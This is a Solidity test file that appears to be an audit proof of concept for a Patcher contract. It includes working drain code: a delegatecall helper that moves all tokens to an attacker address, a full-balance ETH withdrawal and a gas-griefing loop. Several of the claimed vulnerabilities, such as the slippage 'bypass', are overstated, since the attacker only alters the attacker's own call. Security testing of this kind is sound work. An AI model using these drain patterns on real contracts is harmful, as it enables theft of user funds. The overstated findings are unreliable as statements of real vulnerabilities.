// SPDX-License-Identifier: LGPL-3.0
pragma solidity ^0.8.17;

import { TestBase } from "../utils/TestBase.sol";
import { Patcher } from "../../../src/Periphery/Patcher.sol";
import { TestToken as ERC20 } from "../utils/TestToken.sol";

/**
 * @title PatcherVulnerabilities
 * @notice Tests demonstrating novel permissionless vulnerabilities in the Patcher contract
 * @dev These tests show how attackers can exploit undocumented vulnerabilities for economic gain
 */
contract PatcherVulnerabilitiesTest is TestBase {
    Patcher public patcher;
    ERC20 public token;
    
    // Test addresses
    address public constant ATTACKER = address(0xBAD);
    address public constant VICTIM = address(0x1234);
    
    event PatchExecuted(
        address indexed caller,
        address indexed finalTarget,
        uint256 value,
        bool success,
        uint256 returnDataLength
    );

    function setUp() public {
        patcher = new Patcher();
        token = new ERC20("Test Token", "TT", 18);
        
        // Give victim some tokens and ETH
        token.mint(VICTIM, 1000 ether);
        vm.deal(VICTIM, 10 ether);
        
        // Give attacker some ETH for gas
        vm.deal(ATTACKER, 1 ether);
    }

    /**
     * @notice VULNERABILITY #1: Value Source Manipulation Attack
     * @dev Attacker deploys malicious valueSource to return crafted values
     *      This can bypass business logic, slippage protections, and manipulate DEX swaps
     */
    function testVulnerability_ValueSourceManipulation() public {
        // Deploy malicious value source that returns attacker-controlled values
        MaliciousValueSource maliciousSource = new MaliciousValueSource();
        
        // Deploy victim's DEX contract that should have slippage protection
        VictimDEX dex = new VictimDEX();
        
        // Victim wants to swap with 5% slippage protection
        // They expect to get at least 950 tokens for 1000 input tokens
        uint256 inputAmount = 1000 ether;
        uint256 minimumOutput = 950 ether;
        
        // Create legitimate swap calldata with placeholder for minimum output
        bytes memory swapCalldata = abi.encodeWithSelector(
            VictimDEX.swap.selector,
            inputAmount,
            0 // placeholder for minimum output - will be patched
        );
        
        // Calculate offset for the minimum output parameter (2nd parameter = 4 bytes selector + 32 bytes first param)
        uint256[] memory offsets = new uint256[](1);
        offsets[0] = 36; // Position of second parameter
        
        // ATTACK: Attacker manipulates the value source to return a much lower minimum
        // This bypasses the victim's slippage protection!
        maliciousSource.setReturnValue(100 ether); // Only 10% of expected minimum!
        
        // Attacker calls executeWithDynamicPatches using malicious value source
        vm.prank(ATTACKER);
        (bool success, ) = patcher.executeWithDynamicPatches(
            address(maliciousSource), // malicious value source
            abi.encodeWithSelector(MaliciousValueSource.getMaliciousValue.selector),
            address(dex), // victim's DEX
            0, // no ETH
            swapCalldata,
            offsets,
            false
        );
        
        assertTrue(success, "Attack should succeed");
        
        // Verify the attack worked - DEX received manipulated minimum output
        assertEq(dex.lastMinimumOutput(), 100 ether, "Slippage protection bypassed");
        assertLt(dex.lastMinimumOutput(), minimumOutput, "Attacker successfully lowered slippage protection");
        
        // ECONOMIC IMPACT: In a real DEX, this would allow:
        // 1. Attacker to provide worse rates than victim intended
        // 2. Potential for sandwich attacks with manipulated slippage
        // 3. Bypass of oracle-based protections
    }

    /**
     * @notice VULNERABILITY #2: ETH Dust Collection Attack  
     * @dev Anyone can drain accumulated excess ETH from the contract
     */
    function testVulnerability_ETHDustCollection() public {
        // Simulate users accidentally sending excess ETH to Patcher
        // This happens when msg.value > value parameter
        vm.deal(address(patcher), 5 ether); // Simulate accumulated dust
        
        // Create attacker's contract to receive the stolen ETH
        AttackerReceiver receiver = new AttackerReceiver();
        
        // Create dummy calldata for a function that does nothing but accepts ETH
        bytes memory calldata_ = abi.encodeWithSelector(AttackerReceiver.receiveETH.selector);
        
        uint256 stolenAmount = address(patcher).balance;
        uint256 attackerBalanceBefore = ATTACKER.balance;
        
        // ATTACK: Drain all ETH from Patcher using carefully crafted call
        vm.prank(ATTACKER);
        (bool success, ) = patcher.executeWithDynamicPatches(
            address(this), // any contract with a function returning uint256
            abi.encodeWithSelector(this.getDummyValue.selector),
            address(receiver), // attacker's contract
            stolenAmount, // value = entire Patcher ETH balance
            calldata_,
            new uint256[](1), // dummy offset that won't cause issues
            false
        );
        
        assertTrue(success, "Attack should succeed");
        assertEq(address(patcher).balance, 0, "All ETH should be drained");
        assertEq(address(receiver).balance, stolenAmount, "Attacker should receive the ETH");
        
        // ECONOMIC IMPACT: Direct theft of accumulated user funds
        console.log("Stolen ETH amount:", stolenAmount);
    }
    
    /**
     * @notice VULNERABILITY #3: Delegatecall Storage Manipulation
     * @dev Malicious finalTarget can manipulate Patcher storage when delegateCall=true
     */
    function testVulnerability_DelegatecallStorageManipulation() public {
        // Deploy malicious contract that will manipulate storage via delegatecall
        MaliciousDelegate maliciousDelegate = new MaliciousDelegate();
        
        // Fund the Patcher with some tokens (simulating deposit scenario)
        token.mint(address(patcher), 1000 ether);
        
        uint256 initialBalance = token.balanceOf(address(patcher));
        assertTrue(initialBalance > 0, "Patcher should have tokens");
        
        // ATTACK: Use delegatecall to execute malicious code in Patcher's context
        vm.prank(ATTACKER);
        (bool success, ) = patcher.executeWithDynamicPatches(
            address(this), // any contract with uint256 function
            abi.encodeWithSelector(this.getDummyValue.selector),
            address(maliciousDelegate), // malicious contract
            0,
            abi.encodeWithSelector(MaliciousDelegate.drainTokens.selector, address(token), ATTACKER),
            new uint256[](1), // dummy offset
            true // CRITICAL: delegateCall = true
        );
        
        assertTrue(success, "Attack should succeed");
        assertEq(token.balanceOf(address(patcher)), 0, "All tokens should be drained");
        assertEq(token.balanceOf(ATTACKER), initialBalance, "Attacker should receive the tokens");
        
        // ECONOMIC IMPACT: Complete theft of any tokens in Patcher contract
    }

    /**
     * @notice VULNERABILITY #4: Static Call Gas Griefing
     * @dev Malicious valueSource can prevent time-sensitive operations
     */
    function testVulnerability_StaticCallGasGriefing() public {
        GasGriefingContract griefingContract = new GasGriefingContract();
        
        // Simulate time-sensitive operation (like liquidation) that must complete quickly
        vm.prank(VICTIM);
        
        // This should fail due to gas griefing
        vm.expectRevert(); // Will revert due to out of gas
        patcher.executeWithDynamicPatches{gas: 100000}( // Limited gas
            address(griefingContract),
            abi.encodeWithSelector(GasGriefingContract.consumeAllGas.selector),
            address(this),
            0,
            abi.encodeWithSelector(this.getDummyValue.selector),
            new uint256[](1),
            false
        );
        
        // ECONOMIC IMPACT: Prevention of time-sensitive operations like liquidations
        // Could lead to bad debt in lending protocols
    }

    /**
     * @notice VULNERABILITY #5: Multiple Value Sources Coordination Attack
     * @dev Attacker coordinates multiple malicious value sources for complex attacks
     */
    function testVulnerability_MultipleValueSourcesCoordination() public {
        // Deploy multiple malicious value sources
        MaliciousValueSource source1 = new MaliciousValueSource();
        MaliciousValueSource source2 = new MaliciousValueSource();
        
        // Set coordinated malicious values
        source1.setReturnValue(999999 ether); // Extremely high value
        source2.setReturnValue(1); // Extremely low value
        
        address[] memory sources = new address[](2);
        sources[0] = address(source1);
        sources[1] = address(source2);
        
        bytes[] memory getters = new bytes[](2);
        getters[0] = abi.encodeWithSelector(MaliciousValueSource.getMaliciousValue.selector);
        getters[1] = abi.encodeWithSelector(MaliciousValueSource.getMaliciousValue.selector);
        
        // Create offset groups to patch different parameters
        uint256[][] memory offsetGroups = new uint256[][](2);
        offsetGroups[0] = new uint256[](1);
        offsetGroups[0][0] = 4; // First parameter
        offsetGroups[1] = new uint256[](1);
        offsetGroups[1][0] = 36; // Second parameter
        
        VictimDEX dex = new VictimDEX();
        
        // Create calldata for function with two parameters
        bytes memory calldata_ = abi.encodeWithSelector(
            VictimDEX.swap.selector,
            0, // will be patched with 999999 ether
            0  // will be patched with 1
        );
        
        vm.prank(ATTACKER);
        (bool success, ) = patcher.executeWithMultiplePatches(
            sources,
            getters,
            address(dex),
            0,
            calldata_,
            offsetGroups,
            false
        );
        
        assertTrue(success, "Coordinated attack should succeed");
        
        // Verify coordinated manipulation
        assertEq(dex.lastInputAmount(), 999999 ether, "Input manipulated to huge value");
        assertEq(dex.lastMinimumOutput(), 1, "Output manipulated to tiny value");
        
        // ECONOMIC IMPACT: Sophisticated manipulation of multiple parameters
        // Can bypass complex validation logic that checks relationships between parameters
    }

    // Helper function for tests
    function getDummyValue() external pure returns (uint256) {
        return 12345;
    }
}

/**
 * @notice Malicious value source that returns attacker-controlled values
 */
contract MaliciousValueSource {
    uint256 private maliciousValue;
    
    function setReturnValue(uint256 _value) external {
        maliciousValue = _value;
    }
    
    function getMaliciousValue() external view returns (uint256) {
        return maliciousValue;
    }
}

/**
 * @notice Victim DEX contract with supposed slippage protection
 */
contract VictimDEX {
    uint256 public lastInputAmount;
    uint256 public lastMinimumOutput;
    
    function swap(uint256 inputAmount, uint256 minimumOutput) external {
        lastInputAmount = inputAmount;
        lastMinimumOutput = minimumOutput;
        
        // In real DEX, this would execute swap with these parameters
        // The manipulated minimumOutput bypasses slippage protection
    }
}

/**
 * @notice Attacker's contract to receive stolen ETH
 */
contract AttackerReceiver {
    receive() external payable {}
    
    function receiveETH() external payable {
        // Function that accepts ETH - used in ETH theft attack
    }
}

/**
 * @notice Malicious contract for delegatecall storage manipulation
 */
contract MaliciousDelegate {
    function drainTokens(address tokenAddress, address recipient) external {
        // When called via delegatecall, this executes in Patcher's context
        // Can directly manipulate Patcher's token balances
        ERC20 token = ERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this)); // 'this' is Patcher in delegatecall context
        token.transfer(recipient, balance);
    }
}

/**
 * @notice Contract that consumes all available gas
 */
contract GasGriefingContract {
    function consumeAllGas() external view returns (uint256) {
        // Consume all available gas to grief the caller
        uint256 counter = 0;
        while (gasleft() > 1000) {
            counter++;
        }
        return counter;
    }
}